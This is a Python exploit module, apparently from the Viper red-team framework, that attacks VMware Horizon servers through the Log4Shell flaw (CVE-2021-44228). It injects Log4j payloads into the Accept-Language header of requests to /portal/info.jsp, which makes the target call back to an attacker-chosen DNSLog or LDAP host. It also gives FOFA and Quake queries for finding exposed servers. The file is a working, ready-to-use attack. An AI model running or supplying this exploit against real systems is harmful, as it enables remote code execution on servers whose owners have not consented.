# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

import requests

from Lib.ModuleAPI import *
from Lib.api import get_one_uuid_str
from Lib.log import logger
from Lib.payloads import Log4jPayload


class PostModule(BotPythonModule):
    NAME_ZH = "VMware Horizon Log4j Rce"
    DESC_ZH = "模块利用CVE-2021-44228 (Log4Shell)攻击VMware Horizon网站.\n" \
              "请查看Dnslog或LDAPServer连接记录查看是否攻击成功.\n" \
              "模块本身无回显信息"

    NAME_EN = "VMware Horizon Log4j Rce"
    DESC_EN = "The module uses cve-2021-44228 (log4 shell) to attack VMware horizon website \n" \
              "Please check dnslog or ldapserver connection record to see if the attack is successful \n" \
              "The module itself has no echo information"

    MODULETYPE = TAG2TYPE.Bot_PY_Scan
    README = ["https://www.yuque.com/vipersec/module/hq9fy9"]
    REFERENCES = [""]
    AUTHOR = ["Viper"]
    SEARCH = {
        "FOFA": 'title="VMware Horizon" && service="http/ssl" ',
        "Quake": 'title: "VMware Horizon" AND service: "http/ssl"',
    }
    OPTIONS = register_options([
        OptionStr(name='DNSLOG',
                  tag_zh="DNSLOG/LDAPServer", desc_zh="DNSLog主域名,例如:9fppts.ceye.io,或LDAP服务器,例如:192.168.146.130:1339",
                  tag_en="DNSLOG/LDAPServer",
                  desc_en="DNSLog Domain,e.g.:9fppts.ceye.io,or LDAP server,e.g.:192.168.146.130:1339"),
        OptionInt(name='TIMEOUT',
                  tag_zh="请求超时时间", desc_zh="每个Request请求超时时间(秒)",
                  tag_en="Request Timeout", desc_en="Every http request timeout (seconds)",
                  default=1),
    ])

    def __init__(self, ip, port, protocol, custom_param):
        super().__init__(ip, port, protocol, custom_param)

    def payload_list(self, req_uuid):
        if self.param("DNSLOG") is None:
            return []
        payloads = Log4jPayload().get_payload_list(req_uuid, self.param("DNSLOG"))
        return payloads

    def run(self):
        """调用父类主函数(必须调用)"""

        req_uuid = get_one_uuid_str()
        payloads = self.payload_list(req_uuid)

        url = f"https://{self._ip}:{self._port}/portal/info.jsp"

        uuid_data = {
            "UUID": req_uuid,
            "TAG": "VMware_Horizon_Log4j",
            "LEVEL": "INFO",
            "DATA": {
                "url": url,
            }}
        UUIDJson.store_uuid_json(uuid_data)

        for payload in payloads:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
                "Connection": "close",
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                "Accept-Language": payload,
                'Accept-Encoding': 'gzip',
            }
            try:
                result = requests.get(url=url, headers=headers, verify=False, timeout=self.param("TIMEOUT"))
            except requests.ReadTimeout as _:
                pass
            except requests.ConnectTimeout as _:
                pass
            except requests.ConnectionError as _:
                pass
            except Exception as E:
                logger.exception(E)
        return False
